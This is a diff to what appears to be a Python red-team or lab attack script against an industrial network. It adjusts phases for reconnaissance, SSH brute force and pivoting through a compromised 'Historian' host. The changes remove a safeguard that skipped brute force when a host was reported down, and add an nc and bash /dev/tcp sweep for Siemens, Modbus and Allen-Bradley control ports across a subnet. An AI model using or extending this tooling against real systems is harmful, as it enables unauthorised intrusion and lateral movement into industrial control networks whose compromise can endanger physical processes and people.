@@ -498,12 +498,18 @@ def phase2_idmz_recon() -> PhaseResult:
     historian_found = CFG["historian"]["ip"] in out
     honeypot_found  = CFG["honeypot"]["ip"]  in out
 
+    # Fallback: if nmap output didn't include the IP string (e.g. buffering issue),
+    # do a direct TCP check on port 22 to confirm reachability
+    if not historian_found:
+        info("IP not found in nmap output — falling back to TCP probe on port 22")
+        historian_found = _tcp_reachable(CFG["historian"]["ip"], 22, timeout=2.0)
+
     if historian_found:
-        ok(f"Historian found at {CFG['historian']['ip']}")
+        ok(f"Historian confirmed at {CFG['historian']['ip']}")
         r.finding = f"Historian ({CFG['historian']['ip']}) reachable"
         r.status  = "success"
     else:
-        warn("Historian not found in scan output — check connectivity")
+        warn("Historian not reachable via nmap or TCP probe — check routing/FortiGate")
         r.status  = "failed"
         r.finding = "Historian not reachable"
 
@@ -664,19 +670,11 @@ def phase3_ssh_bruteforce() -> PhaseResult:
 
     info(f"Target: {user}@{ip}:{port}")
 
-    # ── Fail-fast: abort if Phase 2 marked host down ───────────────────────────
-    last_phase2 = next(
-        (res for res in reversed(results) if res.phase == "IDMZ Recon"), None
-    )
-    if last_phase2 and last_phase2.status == "failed":
-        r.status  = "failed"
-        r.finding = f"Target unreachable — Phase 2 reported {ip} as down, skipping"
-        err(r.finding)
-        return r
-
-    # ── Fail-fast: 1-second TCP socket probe ──────────────────────────────────
+    # ── Fail-fast: TCP probe only — don't gate on Phase 2 status ─────────────
+    # Phase 2 may report failed due to nmap quirks while SSH is still open.
+    # The TCP probe is the only authoritative reachability check.
     info(f"TCP probe → {user}@{ip}:{port} ...")
-    if not _tcp_reachable(ip=ip, port=port, timeout=1.0):
+    if not _tcp_reachable(ip=ip, port=port, timeout=2.0):
         r.status  = "failed"
         r.finding = f"Target unreachable — {ip}:{port} timed out (FortiGate may be blocking)"
         err(r.finding)
@@ -765,14 +763,31 @@ def phase4_ssh_pivot() -> PhaseResult:
         console.print("\n[bold cyan]OT Fingerprinting Sweep (nc multi-port)[/bold cyan]")
         info("Probing ports 44818 (AB), 102 (Siemens), 502 (Modbus) across 10.20.20.1–254...")
 
-        sweep_cmd = (
-            "for i in {1..254}; do "
-            "(for p in 102 502 44818; do "
-            "nc -z -w 1 10.20.20.$i $p 2>/dev/null "
-            "&& echo \"10.20.20.$i:$p\"; "
-            "done) & "
-            "done; wait"
-        )
+        # Check if nc is available on the Historian; fall back to /dev/tcp if not
+        nc_check, _, nc_rc = ssh_run(client, "which nc || which ncat || which netcat")
+        has_nc = nc_rc == 0 and nc_check.strip()
+
+        if has_nc:
+            sweep_cmd = (
+                "for i in {1..254}; do "
+                "(for p in 102 502 44818; do "
+                "nc -z -w 1 10.20.20.$i $p 2>/dev/null "
+                "&& echo \"10.20.20.$i:$p\"; "
+                "done) & "
+                "done; wait"
+            )
+        else:
+            # bash /dev/tcp fallback — works without nc on most Linux systems
+            warn("nc not found on Historian — using bash /dev/tcp fallback")
+            sweep_cmd = (
+                "for i in {1..254}; do "
+                "(for p in 102 502 44818; do "
+                "(bash -c \"echo > /dev/tcp/10.20.20.$i/$p\" 2>/dev/null "
+                "&& echo \"10.20.20.$i:$p\"); "
+                "done) & "
+                "done; wait"
+            )
+
         sweep_out, _, _ = ssh_run(client, sweep_cmd, timeout=60)
 
         # Parse "IP:PORT" lines, filter out IDS and gateway
